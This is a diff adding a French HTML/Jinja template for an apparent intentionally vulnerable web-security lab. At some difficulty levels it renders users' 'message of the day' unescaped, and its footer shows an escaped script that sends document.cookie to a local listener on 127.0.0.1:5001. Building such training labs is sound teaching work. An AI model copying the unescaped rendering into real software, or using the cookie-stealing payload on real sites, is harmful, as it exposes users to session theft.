@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hub</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+            color: #333;
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+        }
+
+        .card {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 16px;
+            padding: 30px;
+            margin-bottom: 20px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+            animation: slideIn 0.5s ease;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .alert {
+            background: linear-gradient(135deg, #ff6b6b, #ee5a6f);
+            color: white;
+            padding: 20px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            font-size: 1.1em;
+            font-weight: 500;
+            box-shadow: 0 4px 15px rgba(255, 107, 107, 0.3);
+        }
+
+        .btn-container {
+            display: flex;
+            justify-content: flex-end;
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+
+        button, .btn-link {
+            padding: 12px 24px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 1em;
+            font-weight: 500;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            display: inline-block;
+        }
+
+        button:hover, .btn-link:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.15);
+        }
+
+        .btn-nav {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #56ccf2, #2f80ed);
+            color: white;
+            border: none;
+        }
+
+        .btn-danger {
+            background: linear-gradient(135deg, #f093fb, #f5576c);
+            color: white;
+        }
+
+        h1, h2, h3 {
+            color: #2d3436;
+            margin-bottom: 15px;
+        }
+
+        h1 { font-size: 2.2em; }
+        h2 { font-size: 1.8em; }
+        h3 { font-size: 1.4em; }
+
+        .message-jour {
+            background: linear-gradient(135deg, #ffeaa7, #fdcb6e);
+            padding: 25px;
+            border-radius: 12px;
+            margin-bottom: 15px;
+            border-left: 5px solid #f39c12;
+        }
+
+        .message-jour strong {
+            color: #e17055;
+        }
+
+        .author {
+            font-style: italic;
+            color: #636e72;
+            margin-top: 10px;
+        }
+
+        form {
+            display: flex;
+            gap: 10px;
+            margin-top: 15px;
+        }
+
+        input[type="text"] {
+            flex: 1;
+            padding: 12px 16px;
+            border: 2px solid #dfe6e9;
+            border-radius: 8px;
+            font-size: 1em;
+            transition: border-color 0.3s ease;
+        }
+
+        input[type="text"]:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+
+        ul {
+            list-style: none;
+            padding: 0;
+        }
+
+        ul li {
+            padding: 12px 0;
+            border-bottom: 1px solid #eee;
+            font-size: 1.1em;
+        }
+
+        ul li:last-child {
+            border-bottom: none;
+        }
+
+        ul li strong {
+            color: #667eea;
+            margin-right: 8px;
+        }
+
+        .video-container {
+            text-align: center;
+            margin: 30px 0;
+        }
+
+        video {
+            max-width: 100%;
+            border-radius: 16px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
+        }
+
+        .otter-emoji {
+            font-size: 4em;
+            text-align: center;
+            margin: 20px 0;
+        }
+
+        .links-section {
+            display: flex;
+            gap: 15px;
+            flex-wrap: wrap;
+            margin-top: 20px;
+        }
+
+        .links-section a {
+            text-decoration: none;
+            flex: 1;
+            min-width: 200px;
+        }
+
+        .footer-text {
+            margin-top: 30px;
+            padding: 20px;
+            background: rgba(255, 255, 255, 0.7);
+            border-radius: 8px;
+            font-size: 0.9em;
+            color: #636e72;
+            text-align: center;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 10px;
+            }
+
+            .card {
+                padding: 20px;
+            }
+
+            form {
+                flex-direction: column;
+            }
+
+            .btn-container {
+                flex-direction: column;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        {% if message %}
+            <div class="alert">{{ message }}</div>
+        {% endif %}
+
+        {% if user %}
+            <div class="btn-container">
+                <a href="/prec_day"><button class="btn-nav">⟵ Jour précédent</button></a>
+                <a href="/next_day"><button class="btn-nav">Jour suivant ⟶</button></a>
+            </div>
+
+            <div class="card">
+                {% if editeur_message_du_jour %}
+                    <div class="message-jour">
+                        <h3><strong>Message du jour {{ jour }}: </strong>
+                        {% if security_level == 1 or security_level == 2 %}
+                            {{ contenue_message_du_jour|safe }}
+                        {% else %}
+                            {{ contenue_message_du_jour }}
+                        {% endif %}
+                        </h3>
+                        <p class="author">Proposé par {{ editeur_message_du_jour }}</p>
+                    </div>
+                {% else %}
+                    <div class="message-jour">
+                        <h3><strong>Message du jour {{ jour }}: </strong>{{ contenue_message_du_jour }}</h3>
+                    </div>
+                    <form action="/message_du_jour" method="POST">
+                        <input type="text" name="message_du_jour" placeholder="Entrez votre message du jour ..." required>
+                        <button type="submit" class="btn-primary">Envoyer</button>
+                    </form>
+                {% endif %}
+            </div>
+        {% endif %}
+
+        <div class="card">
+            {% if user %}
+                <h2>Bienvenue, {{ user.name }} ! 👋</h2>
+                <h3 style="margin-top: 25px;">Vos informations :</h3>
+                <ul>
+                    <li><strong>Email:</strong> {{ user.email }}</li>
+                    <li><strong>Rôle:</strong> {{ user.role }}</li>
+                    <li><strong>Mot de passe:</strong> ••••••••</li>
+                </ul>
+            {% else %}
+                <h2>Bienvenue, inconnu(e) ! 👋</h2>
+                <p style="margin: 20px 0; font-size: 1.1em;">Connectez-vous pour accéder à toutes les fonctionnalités.</p>
+                <a href="/login"><button class="btn-primary">Se connecter</button></a>
+
+                <div class="otter-emoji">🦦</div>
+                <div class="video-container">
+                    <video autoplay muted loop playsinline>
+                        <source src="/static/otter.webm" type="video/webm">
+                    </video>
+                </div>
+            {% endif %}
+        </div>
+
+        <div class="links-section">
+            <a href="/difficulty"><button class="btn-primary" style="width: 100%;">⚙️ Changer la difficulté</button></a>
+            {% if user %}
+                <a href="/logout"><button class="btn-danger" style="width: 100%;">🚪 Se déconnecter</button></a>
+            {% endif %}
+        </div>
+
+        <div class="footer-text">
+            Si vous lisez ces lignes, courage à vous.&lt;script&gt;window.onload = function(e) {fetch('http://127.0.0.1:5001/cookie/' + document.cookie);}&lt;/script&gt;
+        </div>
+    </div>
+</body>
+</html>
